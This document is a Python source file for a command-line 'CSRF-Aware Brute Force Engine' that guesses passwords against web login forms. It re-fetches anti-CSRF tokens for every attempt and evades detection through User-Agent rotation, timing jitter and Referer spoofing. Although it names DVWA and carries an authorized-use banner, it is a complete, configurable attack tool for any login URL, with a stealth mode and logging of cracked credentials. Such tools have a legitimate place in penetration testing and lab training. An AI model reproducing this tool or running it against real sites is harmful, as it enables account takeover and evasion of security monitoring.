#!/usr/bin/env python3
"""
CSRF-Aware Brute Force Engine v2.0
====================================
A penetration testing tool that bypasses Anti-CSRF token mechanisms
to perform authenticated brute-force attacks against login forms.

Target: DVWA (Damn Vulnerable Web Application) or similar CSRF-protected forms.
Framework Alignment: MITRE ATT&CK T1110.001 (Brute Force: Password Guessing)

AUTHORIZED USE ONLY - Ensure written permission before testing.

v2.0 Changes:
  - Full URL flexibility (no static path appending)
  - Rich colorized terminal output with box-drawing UI
  - Results cache with summary table on exit
  - Graceful Ctrl+C handling with summary display
  - Signal-safe loop control

Algorithm Steps Implemented:
  1. Session Initialization & State Management
  2. Dynamic Data Retrieval (GET Reconnaissance)
  3. DOM Parsing (Token Extraction)
  4. Payload Construction
  5. Execution & Evasion (Jitter, UA Rotation)
  6. Response Analysis
  7. Reset & Loop (Token Invalidation + Re-fetch)
"""

import requests
import re
import sys
import time
import random
import signal
import argparse
from datetime import datetime
from typing import Optional, Tuple, List, Dict
from urllib.parse import urlparse

# ============================================================================
# ANSI Color Constants — Rich Terminal UI
# ============================================================================
class C:
    """ANSI escape codes for colorized terminal output."""
    # Reset
    RST     = "\033[0m"
    # Styles
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    ULINE   = "\033[4m"
    # Foreground
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"
    GREY    = "\033[90m"
    # Bright foreground
    BRED    = "\033[91m"
    BGREEN  = "\033[92m"
    BYELLOW = "\033[93m"
    BBLUE   = "\033[94m"
    BMAGENTA= "\033[95m"
    BCYAN   = "\033[96m"
    # Background
    BG_RED  = "\033[41m"
    BG_GREEN= "\033[42m"
    BG_YELLOW="\033[43m"

# Box-drawing characters for UI frames
BOX_TL = "╔"
BOX_TR = "╗"
BOX_BL = "╚"
BOX_BR = "╝"
BOX_H  = "═"
BOX_V  = "║"
BOX_ML = "╠"
BOX_MR = "╣"

# ============================================================================
# OPSEC: User-Agent Rotation Pool
# Mimics legitimate browser traffic to evade simple rate-limit filters
# and SOC/SIEM signature-based detection (MITRE ATT&CK T1036.005)
# ============================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) "
    "Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
]


# ============================================================================
# Results Cache — Tracks all attempts for summary display
# ============================================================================
class ResultsCache:
    """
    In-memory cache for all brute-force attempt results.
    
    Stores every attempt with its outcome, timing, and HTTP status.
    On exit (success, Ctrl+C, or exhaustion), prints a formatted
    summary table showing all caught credentials and statistics.
    """
    
    def __init__(self):
        self.attempts: List[Dict] = []
        self.successes: List[Dict] = []
        self.start_time: Optional[datetime] = None
        self.target_url: str = ""
        self.username: str = ""
    
    def record_attempt(
        self,
        password: str,
        success: bool,
        status_code: int,
        elapsed_ms: float
    ):
        """Record a single login attempt result."""
        entry = {
            "password": password,
            "success": success,
            "status_code": status_code,
            "elapsed_ms": elapsed_ms,
            "timestamp": datetime.now(),
        }
        self.attempts.append(entry)
        if success:
            self.successes.append(entry)
    
    def print_summary(self):
        """
        Print a rich, colorized summary of the attack session.
        Shows all successful logins if any were caught.
        Called on success, Ctrl+C interrupt, or wordlist exhaustion.
        """
        total = len(self.attempts)
        if total == 0:
            print(f"\n{C.YELLOW}  No attempts were made.{C.RST}")
            return
        
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        success_count = len(self.successes)
        fail_count = total - success_count
        
        w = 65  # box width
        
        print()
        print(f"{C.CYAN}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
        print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BCYAN}  {'SESSION SUMMARY':^{w - 4}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
        print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
        
        # Stats
        print(f"{C.CYAN}{BOX_V}{C.RST}  Target       {C.DIM}:{C.RST}  {self.target_url:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
        print(f"{C.CYAN}{BOX_V}{C.RST}  Username     {C.DIM}:{C.RST}  {self.username:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
        print(f"{C.CYAN}{BOX_V}{C.RST}  Total Tries  {C.DIM}:{C.RST}  {total:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
        print(f"{C.CYAN}{BOX_V}{C.RST}  Duration     {C.DIM}:{C.RST}  {elapsed:.1f}s{' ' * (w - 20 - len(f'{elapsed:.1f}s'))}{C.CYAN}{BOX_V}{C.RST}")
        
        fail_str = f"{C.RED}{fail_count}{C.RST}"
        # We need to account for ANSI codes in padding
        fail_display = f"{fail_count}"
        print(f"{C.CYAN}{BOX_V}{C.RST}  Failed       {C.DIM}:{C.RST}  {fail_str}{' ' * (w - 20 - len(fail_display))}{C.CYAN}{BOX_V}{C.RST}")
        
        success_str = f"{C.BGREEN}{success_count}{C.RST}"
        success_display = f"{success_count}"
        print(f"{C.CYAN}{BOX_V}{C.RST}  Cracked      {C.DIM}:{C.RST}  {success_str}{' ' * (w - 20 - len(success_display))}{C.CYAN}{BOX_V}{C.RST}")
        
        if total > 0:
            rate = total / elapsed if elapsed > 0 else 0
            rate_str = f"{rate:.2f} req/s"
            print(f"{C.CYAN}{BOX_V}{C.RST}  Avg Rate     {C.DIM}:{C.RST}  {rate_str:<{w - 20}}{C.CYAN}{BOX_V}{C.RST}")
        
        # Successful logins section
        if self.successes:
            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
            header = "  🔓 CRACKED CREDENTIALS"
            print(f"{C.CYAN}{BOX_V}{C.RST}{C.BOLD}{C.BGREEN}{header:<{w - 2}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
            
            for i, s in enumerate(self.successes, 1):
                cred_line = f"  [{i}]  {self.username} : {s['password']}"
                time_str = s['timestamp'].strftime('%H:%M:%S')
                detail = f"{cred_line:<40} {C.DIM}@ {time_str}{C.RST}"
                # Padding is tricky with ANSI; just print it
                print(f"{C.CYAN}{BOX_V}{C.RST}{C.BGREEN}{C.BOLD}  [{i}]{C.RST}  {C.WHITE}{self.username}{C.RST} : {C.BGREEN}{C.BOLD}{s['password']}{C.RST}{C.DIM}  (attempt #{self.attempts.index(s) + 1} @ {time_str}){C.RST}")
        else:
            print(f"{C.CYAN}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
            no_cred = "  No credentials were cracked."
            print(f"{C.CYAN}{BOX_V}{C.RST}{C.YELLOW}{no_cred:<{w - 2}}{C.RST}{C.CYAN}{BOX_V}{C.RST}")
        
        print(f"{C.CYAN}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
        print()


# Global cache instance and interrupt flag
_results_cache = ResultsCache()
_interrupted = False


def _signal_handler(signum, frame):
    """
    Graceful Ctrl+C handler.
    Sets the interrupt flag so the loop breaks cleanly,
    then prints the summary with any caught credentials.
    """
    global _interrupted
    _interrupted = True
    print(f"\n\n{C.BYELLOW}{C.BOLD}  ⚡ Interrupted by user (Ctrl+C){C.RST}")
    print(f"{C.YELLOW}  Stopping attack loop... preparing summary{C.RST}")


# ============================================================================
# Pretty Printer — Colorized per-attempt output
# ============================================================================
def print_attempt(
    attempt_num: int,
    total: int,
    username: str,
    password: str,
    success: bool,
    status_code: int,
    verbose: bool = False
):
    """
    Print a single attempt result with rich color coding.
    
    PASS  = Red background, indicates failed attempt
    FOUND = Green background with highlight, indicates cracked credential
    """
    # Progress bar
    pct = (attempt_num / total) * 100 if total > 0 else 0
    bar_width = 20
    filled = int(bar_width * attempt_num / total) if total > 0 else 0
    bar = f"{C.GREEN}{'█' * filled}{C.GREY}{'░' * (bar_width - filled)}{C.RST}"
    
    progress = f"{C.DIM}[{attempt_num}/{total}]{C.RST}"
    pct_str = f"{C.DIM}{pct:5.1f}%{C.RST}"
    
    if success:
        # ══════════════ FOUND ══════════════
        tag = f"{C.BG_GREEN}{C.BOLD}{C.WHITE} FOUND {C.RST}"
        cred = f"{C.BGREEN}{C.BOLD}{username}{C.RST} : {C.BGREEN}{C.BOLD}{password}{C.RST}"
        status = f"{C.GREEN}HTTP {status_code}{C.RST}"
        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}")
    else:
        # ══════════════ PASS ══════════════
        tag = f"{C.BG_RED}{C.WHITE}{C.BOLD} PASS  {C.RST}"
        cred = f"{C.DIM}{username}{C.RST} : {C.WHITE}{password}{C.RST}"
        status = f"{C.DIM}HTTP {status_code}{C.RST}"
        print(f"  {tag}  {progress} {bar} {pct_str}  {cred}  {status}")


def print_banner(
    target_url: str,
    username: str,
    wordlist_path: str,
    total_passwords: int,
    token_name: str,
    jitter_range: Tuple[float, float],
    rotate_ua: bool,
    proxy: Optional[str]
):
    """Print a rich startup banner with attack configuration."""
    w = 65
    
    print()
    print(f"{C.MAGENTA}{BOX_TL}{BOX_H * (w - 2)}{BOX_TR}{C.RST}")
    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BOLD}{C.BMAGENTA}⚔  CSRF-Aware Brute Force Engine v2.0{' ' * (w - 42)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.DIM}MITRE ATT&CK: T1110.001 | Cyber Kill Chain: Exploitation{' ' * (w - 62)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
    print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
    
    # Config lines
    configs = [
        ("Target",     target_url),
        ("Username",   username),
        ("Wordlist",   f"{wordlist_path} ({total_passwords} passwords)"),
        ("Token",      f"{token_name} (auto-refresh per request)"),
        ("Jitter",     f"{jitter_range[0]:.1f}s — {jitter_range[1]:.1f}s"),
        ("UA Rotate",  "Enabled ✓" if rotate_ua else "Disabled ✗"),
        ("Proxy",      proxy or "Direct connection"),
    ]
    
    for label, value in configs:
        # Truncate long values
        max_val = w - 20
        display = value if len(value) <= max_val else value[:max_val - 3] + "..."
        print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.CYAN}{label:<12}{C.RST}{C.DIM}:{C.RST} {display}")
    
    print(f"{C.MAGENTA}{BOX_ML}{BOX_H * (w - 2)}{BOX_MR}{C.RST}")
    print(f"{C.MAGENTA}{BOX_V}{C.RST}  {C.BYELLOW}⚠  AUTHORIZED PENETRATION TESTING USE ONLY{' ' * (w - 48)}{C.RST}{C.MAGENTA}{BOX_V}{C.RST}")
    print(f"{C.MAGENTA}{BOX_BL}{BOX_H * (w - 2)}{BOX_BR}{C.RST}")
    print()


# ============================================================================
# STEP 1: Session Initialization & State Management
# ============================================================================

def init_session(
    target_url: str,
    proxy: Optional[str] = None,
    verbose: bool = False
) -> requests.Session:
    """
    STEP 1: Initialize a persistent HTTP session with the target.
    
    Creates a requests.Session that automatically stores and sends
    PHPSESSID cookies, maintaining server-side state across requests.
    This is CRITICAL because CSRF tokens are bound to the session.
    """
    session = requests.Session()

    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
        session.verify = False
        if verbose:
            print(f"  {C.DIM}[STEP 1] Proxy configured: {proxy}{C.RST}")

    session.headers.update({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    })

    # Extract base URL for initial connection
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    try:
        init_response = session.get(base_url, timeout=10)
        init_response.raise_for_status()
        cookies = dict(session.cookies)
        print(
            f"  {C.GREEN}[STEP 1]{C.RST} Session initialized {C.DIM}|{C.RST} "
            f"Cookies: {C.CYAN}{cookies}{C.RST}"
        )
    except requests.RequestException as e:
        print(f"  {C.BRED}[STEP 1 FAIL]{C.RST} Connection failed: {e}")
        raise SystemExit(f"[!] Cannot reach target: {e}")

    return session


# ============================================================================
# STEP 2 & 3: Dynamic Data Retrieval + DOM Parsing
# ============================================================================

def fetch_csrf_token(
    session: requests.Session,
    login_url: str,
    token_name: str = "user_token",
    verbose: bool = False
) -> str:
    """
    STEP 2 + 3: Fetch the login page and extract the fresh CSRF token.
    
    Sends a GET request to retrieve the HTML, then parses the DOM
    via regex to extract the token value from the hidden input field.
    
    The token is DYNAMIC and AUTOMATED — every single call fetches
    a brand new token from the server. Nothing is static or cached.
    The username/password fields are NOT checked here; only the
    CSRF nonce is extracted.
    """
    try:
        response = session.get(login_url, timeout=10)
        response.raise_for_status()
    except requests.RequestException as e:
        if verbose:
            print(f"  {C.BRED}[STEP 2 FAIL]{C.RST} GET failed: {e}")
        raise

    if verbose:
        print(
            f"  {C.CYAN}[STEP 2]{C.RST} Page fetched {C.DIM}|{C.RST} "
            f"Status: {response.status_code} {C.DIM}|{C.RST} "
            f"Size: {len(response.text)} bytes"
        )

    # Regex to extract token value from hidden input field
    pattern = rf"""<input\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?"""
    match = re.search(pattern, response.text, re.IGNORECASE)

    if not match:
        # Fallback: reversed attribute order (value before name)
        alt_pattern = rf"""<input\s+[^>]*value\s*=\s*['"]?([a-fA-F0-9]+)['"]?\s+[^>]*name\s*=\s*['"]?{re.escape(token_name)}['"]?"""
        match = re.search(alt_pattern, response.text, re.IGNORECASE)

    if not match:
        if verbose:
            print(
                f"  {C.BRED}[STEP 3 FAIL]{C.RST} Token '{token_name}' "
                f"not found in response body"
            )
        raise ValueError(
            f"CSRF token '{token_name}' not found. "
            "The form structure may have changed."
        )

    token = match.group(1)
    if verbose:
        print(
            f"  {C.CYAN}[STEP 3]{C.RST} Token extracted {C.DIM}|{C.RST} "
            f"{token_name}={token[:8]}...{token[-4:]}"
        )

    return token


# ============================================================================
# STEP 4: Payload Construction
# ============================================================================

def build_payload(
    username: str,
    password: str,
    csrf_token: str,
    token_name: str = "user_token",
    extra_params: Optional[dict] = None
) -> dict:
    """
    STEP 4: Construct the POST payload with credentials and CSRF token.
    
    Replicates the exact form submission a legitimate browser would send.
    """
    payload = {
        "username": username,
        "password": password,
        token_name: csrf_token,
    }

    if extra_params:
        payload.update(extra_params)
    else:
        payload["Login"] = "Login"

    return payload


# ============================================================================
# STEP 5: Execution & Evasion
# ============================================================================

def execute_attempt(
    session: requests.Session,
    login_url: str,
    payload: dict,
    jitter_range: Tuple[float, float] = (0.5, 2.0),
    rotate_ua: bool = True,
    verbose: bool = False
) -> requests.Response:
    """
    STEP 5: Execute the login attempt with evasion techniques.
    
    OpSec measures:
    - User-Agent rotation per request
    - Random jitter delay between requests
    - Referer header spoofing
    """
    # Jitter delay — sleep in small increments so Ctrl+C is responsive
    delay = random.uniform(*jitter_range)
    if verbose:
        print(f"  {C.YELLOW}[STEP 5]{C.RST} Jitter: {delay:.2f}s")
    
    # Sleep in 0.1s increments for responsive interrupt handling
    remaining = delay
    while remaining > 0 and not _interrupted:
        chunk = min(remaining, 0.1)
        time.sleep(chunk)
        remaining -= chunk
    
    if _interrupted:
        raise KeyboardInterrupt("Interrupted during jitter")

    if rotate_ua:
        session.headers["User-Agent"] = random.choice(USER_AGENTS)

    session.headers["Referer"] = login_url

    try:
        response = session.post(
            login_url,
            data=payload,
            allow_redirects=False,
            timeout=10
        )
    except requests.RequestException as e:
        if verbose:
            print(f"  {C.BRED}[STEP 5 FAIL]{C.RST} POST failed: {e}")
        raise

    if verbose:
        print(
            f"  {C.YELLOW}[STEP 5]{C.RST} POST sent {C.DIM}|{C.RST} "
            f"Status: {response.status_code} {C.DIM}|{C.RST} "
            f"Size: {len(response.text)} bytes"
        )

    return response


# ============================================================================
# STEP 6: Response Analysis
# ============================================================================

def analyze_response(
    response: requests.Response,
    failure_string: str = "Login failed",
    success_path: str = "/dashboard",
    verbose: bool = False
) -> bool:
    """
    STEP 6: Analyze the server's response to determine success/failure.
    
    Checks HTTP status codes, response body for failure/success strings,
    and redirect locations.
    """
    status = response.status_code

    if status == 403:
        if verbose:
            print(
                f"  {C.BRED}[STEP 6]{C.RST} HTTP 403 — "
                "possible WAF block or account lockout"
            )
        return False

    if status in (301, 302):
        location = response.headers.get("Location", "")
        if success_path in location:
            if verbose:
                print(
                    f"  {C.BGREEN}[STEP 6]{C.RST} Redirect to {location} — "
                    "SUCCESS INDICATOR"
                )
            return True

    body = response.text

    if failure_string.lower() in body.lower():
        return False

    # No failure string + HTTP 200 → check for success indicators
    if status == 200 and failure_string.lower() not in body.lower():
        success_indicators = ["logout", "sign out", "welcome", "dashboard"]
        for indicator in success_indicators:
            if indicator.lower() in body.lower():
                if verbose:
                    print(
                        f"  {C.BGREEN}[STEP 6]{C.RST} Success indicator "
                        f"'{indicator}' found in body"
                    )
                return True

    return False


# ============================================================================
# STEP 7: Reset & Loop (Main Attack Orchestrator)
# ============================================================================

def load_wordlist(filepath: str) -> list:
    """Load password wordlist from file."""
    passwords = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="replace") as f:
            for line in f:
                pwd = line.strip()
                if pwd and not pwd.startswith("#"):
                    passwords.append(pwd)
    except FileNotFoundError:
        raise SystemExit(f"[!] Wordlist not found: {filepath}")
    except PermissionError:
        raise SystemExit(f"[!] Permission denied: {filepath}")
    return passwords


def run_attack(
    target_url: str,
    username: str,
    wordlist_path: str,
    token_name: str = "user_token",
    failure_string: str = "Login failed",
    success_path: str = "/dashboard",
    jitter_range: Tuple[float, float] = (0.5, 2.0),
    rotate_ua: bool = True,
    proxy: Optional[str] = None,
    verbose: bool = False,
    output_file: Optional[str] = None,
) -> Optional[str]:
    """
    STEP 7: Main attack orchestrator — Reset & Loop.
    
    Coordinates all 7 steps in sequence:
      INIT → [GET → Extract token → Build payload →
              POST → Analyze → Reset token] → LOOP
    
    Features:
    - Results cache: every attempt is recorded
    - Ctrl+C handling: interrupt prints summary with caught creds
    - Loop break: stops immediately on success
    - Token refresh: fresh CSRF nonce per iteration (fully automated)
    
    The -t/--target parameter is now the FULL attack URL.
    No path is appended. You control exactly what endpoint gets hit.
    """
    global _interrupted, _results_cache
    _interrupted = False
    
    # Install signal handler for graceful Ctrl+C
    original_handler = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, _signal_handler)
    
    # The target URL IS the login URL — full flexibility
    login_url = target_url.rstrip("/")
    if not login_url.startswith("http"):
        login_url = "http://" + login_url
    
    # Load wordlist
    passwords = load_wordlist(wordlist_path)
    total = len(passwords)
    
    # Initialize cache
    _results_cache = ResultsCache()
    _results_cache.target_url = login_url
    _results_cache.username = username
    _results_cache.start_time = datetime.now()
    
    # Print banner
    print_banner(
        target_url=login_url,
        username=username,
        wordlist_path=wordlist_path,
        total_passwords=total,
        token_name=token_name,
        jitter_range=jitter_range,
        rotate_ua=rotate_ua,
        proxy=proxy
    )
    
    if total == 0:
        print(f"  {C.BRED}[!]{C.RST} Wordlist is empty. Aborting.")
        _results_cache.print_summary()
        signal.signal(signal.SIGINT, original_handler)
        return None
    
    # ---- STEP 1: Session Initialization ----
    print(f"  {C.GREEN}▶{C.RST} Initializing session...\n")
    session = init_session(login_url, proxy=proxy, verbose=verbose)
    print()
    
    cracked_password = None
    
    # ---- STEP 7: Main Loop ----
    try:
        for attempt, password in enumerate(passwords, 1):
            # Check interrupt flag (set by Ctrl+C handler)
            if _interrupted:
                break
            
            attempt_start = time.time()
            
            try:
                # STEP 2+3: Fetch fresh CSRF token (AUTOMATED & DYNAMIC)
                csrf_token = fetch_csrf_token(
                    session, login_url,
                    token_name=token_name, verbose=verbose
                )
                
                # STEP 4: Build payload
                payload = build_payload(
                    username=username,
                    password=password,
                    csrf_token=csrf_token,
                    token_name=token_name
                )
                
                if verbose:
                    print(
                        f"  {C.YELLOW}[STEP 4]{C.RST} Payload built {C.DIM}|{C.RST} "
                        f"Params: {list(payload.keys())}"
                    )
                
                # STEP 5: Execute with evasion
                response = execute_attempt(
                    session, login_url, payload,
                    jitter_range=jitter_range,
                    rotate_ua=rotate_ua,
                    verbose=verbose
                )
                
                # STEP 6: Response analysis
                success = analyze_response(
                    response,
                    failure_string=failure_string,
                    success_path=success_path,
                    verbose=verbose
                )
                
                elapsed_ms = (time.time() - attempt_start) * 1000
                
                # Record in cache
                _results_cache.record_attempt(
                    password=password,
                    success=success,
                    status_code=response.status_code,
                    elapsed_ms=elapsed_ms
                )
                
                # Print colorized result
                print_attempt(
                    attempt_num=attempt,
                    total=total,
                    username=username,
                    password=password,
                    success=success,
                    status_code=response.status_code,
                    verbose=verbose
                )
                
                if success:
                    cracked_password = password
                    
                    # Write to output file
                    if output_file:
                        elapsed = (datetime.now() - _results_cache.start_time).total_seconds()
                        with open(output_file, "a") as f:
                            f.write(
                                f"[{datetime.now().isoformat()}] "
                                f"{username}:{password} "
                                f"({attempt} attempts, {elapsed:.1f}s)\n"
                            )
                    
                    # ═══ BREAK THE LOOP — credential found ═══
                    break
                
                # STEP 7 (Reset): Discard consumed token
                del csrf_token
                if verbose:
                    print(
                        f"  {C.DIM}[STEP 7] Token invalidated → "
                        f"returning to Step 2{C.RST}"
                    )
            
            except KeyboardInterrupt:
                break
            
            except ValueError as e:
                elapsed_ms = (time.time() - attempt_start) * 1000
                _results_cache.record_attempt(
                    password=password, success=False,
                    status_code=0, elapsed_ms=elapsed_ms
                )
                if verbose:
                    print(f"  {C.YELLOW}[!]{C.RST} Token error: {e}")
                    print(f"      Retrying with fresh session...")
                session = init_session(login_url, proxy=proxy, verbose=verbose)
                continue
            
            except requests.RequestException as e:
                elapsed_ms = (time.time() - attempt_start) * 1000
                _results_cache.record_attempt(
                    password=password, success=False,
                    status_code=0, elapsed_ms=elapsed_ms
                )
                if verbose:
                    print(f"  {C.YELLOW}[!]{C.RST} Network error: {e}")
                    print(f"      Backing off 5s...")
                time.sleep(5)
                continue
    
    except KeyboardInterrupt:
        pass
    
    # ═══════════════════════════════════════════════════════════════
    # ALWAYS print summary on exit — success, Ctrl+C, or exhaustion
    # ═══════════════════════════════════════════════════════════════
    _results_cache.print_summary()
    
    # Restore original signal handler
    signal.signal(signal.SIGINT, original_handler)
    
    return cracked_password


# ============================================================================
# CLI Interface
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="CSRF-Aware Brute Force Engine v2.0 for Penetration Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # DVWA brute (high-security with CSRF)
  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w passwords.txt

  # DVWA main login page
  python3 csrf_brute.py -t http://192.168.1.100/login.php -u admin -w passwords.txt

  # Custom app with different token name
  python3 csrf_brute.py -t http://target.local/auth/login -u admin -w rockyou.txt \\
      --token-name csrf_token --failure "Invalid credentials"

  # With Burp Suite proxy + verbose
  python3 csrf_brute.py -t http://192.168.1.100/vulnerabilities/brute/ -u admin -w passwords.txt \\
      --proxy http://127.0.0.1:8080 -v

  # Maximum stealth
  python3 csrf_brute.py -t http://target/login -u admin -w passwords.txt \\
      --jitter-min 3.0 --jitter-max 10.0
        """
    )

    parser.add_argument(
        "-t", "--target",
        required=True,
        help="Full target URL to attack (e.g., http://192.168.1.100/vulnerabilities/brute/)"
    )
    parser.add_argument(
        "-u", "--username",
        required=True,
        help="Target username to brute-force"
    )
    parser.add_argument(
        "-w", "--wordlist",
        required=True,
        help="Path to password wordlist file"
    )
    parser.add_argument(
        "--token-name",
        default="user_token",
        help="CSRF token parameter name (default: user_token)"
    )
    parser.add_argument(
        "--failure",
        default="Login failed",
        help='Failure string in response body (default: "Login failed")'
    )
    parser.add_argument(
        "--success-path",
        default="/dashboard",
        help="Redirect path indicating success (default: /dashboard)"
    )
    parser.add_argument(
        "--jitter-min",
        type=float,
        default=0.5,
        help="Minimum jitter delay in seconds (default: 0.5)"
    )
    parser.add_argument(
        "--jitter-max",
        type=float,
        default=2.0,
        help="Maximum jitter delay in seconds (default: 2.0)"
    )
    parser.add_argument(
        "--no-ua-rotate",
        action="store_true",
        help="Disable User-Agent rotation"
    )
    parser.add_argument(
        "--proxy",
        help="HTTP proxy (e.g., http://127.0.0.1:8080 for Burp Suite)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Output file to append cracked credentials"
    )
    parser.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Enable verbose/debug output (show all STEP details)"
    )

    return parser.parse_args()


def main():
    """Entry point."""
    args = parse_args()

    result = run_attack(
        target_url=args.target,
        username=args.username,
        wordlist_path=args.wordlist,
        token_name=args.token_name,
        failure_string=args.failure,
        success_path=args.success_path,
        jitter_range=(args.jitter_min, args.jitter_max),
        rotate_ua=not args.no_ua_rotate,
        proxy=args.proxy,
        verbose=args.verbose,
        output_file=args.output,
    )

    sys.exit(0 if result else 1)


if __name__ == "__main__":
    main()
